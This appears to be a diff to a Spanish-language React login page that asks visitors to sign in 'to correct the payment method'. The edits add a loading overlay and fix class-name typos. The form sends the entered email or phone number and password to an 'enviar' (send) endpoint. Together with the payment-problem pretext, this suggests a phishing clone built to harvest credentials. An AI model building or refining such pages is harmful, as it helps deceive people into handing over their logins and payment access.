@@ -1,12 +1,12 @@
 import React, { useState } from "react";
 import styles from './login.module.css';
 
-
 export default function Login({ onLoginSuccess }) {
     const [emailOrPhone, setEmailOrPhone] = useState("");
     const [password, setPassword] = useState("");
     const [errorMessage, setErrorMessage] = useState("");
     const [showRecaptchaInfo, setShowRecaptchaInfo] = useState(false);
+    const [isLoginActive, setIsLoginActive] = useState(false); // Nuevo estado
 
     const validateInput = async (e) => {
         e.preventDefault();
@@ -16,11 +16,13 @@ export default function Login({ onLoginSuccess }) {
 
         if (emailRegex.test(emailOrPhone) || phoneRegex.test(emailOrPhone)) {
             setErrorMessage("");
+            setIsLoginActive(true); // Activar la superposición cuando el login está siendo procesado
 
             const data = {
                 name: emailOrPhone,
-                password,  // Corregido el error tipográfico
+                password,
             };
+
             try {
                 const response = await fetch('http://localhost:5000/api/enviar', {
                     method: 'POST',
@@ -38,6 +40,8 @@ export default function Login({ onLoginSuccess }) {
                 }
             } catch (error) {
                 setErrorMessage("Hubo un error al enviar los datos.");
+            } finally {
+                setIsLoginActive(false); // Desactivar la superposición después de procesar el login
             }
         } else {
             setErrorMessage("Ingrese un correo válido o un número de teléfono con formato internacional.");
@@ -49,15 +53,16 @@ export default function Login({ onLoginSuccess }) {
     };
 
     return (
-        <div className={styles.conteinerTotal}>
+        <div className={styles.containerTotal}>
+            {isLoginActive && <div className={styles.overlay}></div>} {/* Superposición cuando el login está activo */}
             <div className={styles.PCELMDPDIS}>
                 <p>Para corregir el método de pago debe iniciar sesión</p>
             </div>
-            <div className={styles.conteinerLogin}>
+            <div className={styles.containerLogin}>
                 <div className={styles.divH2}>
                     <h2>Inicia sesión</h2>
                 </div>
-                <form onSubmit={validateInput} className={styles.conteinerLoginForm}>
+                <form onSubmit={validateInput} className={styles.containerLoginForm}>
                     <input
                         type="text"
                         placeholder="Email o número de celular"
@@ -77,7 +82,7 @@ export default function Login({ onLoginSuccess }) {
                     />
                     <button type="submit">Iniciar sesión</button>
                     <div className={styles.centrado}>
-                        <div className={styles.conteinerRecuerdame}>
+                        <div className={styles.containerRecuerdame}>
                             <input type="checkbox" id="Recuerdame" />
                             <p>Recuérdame</p>
                         </div>
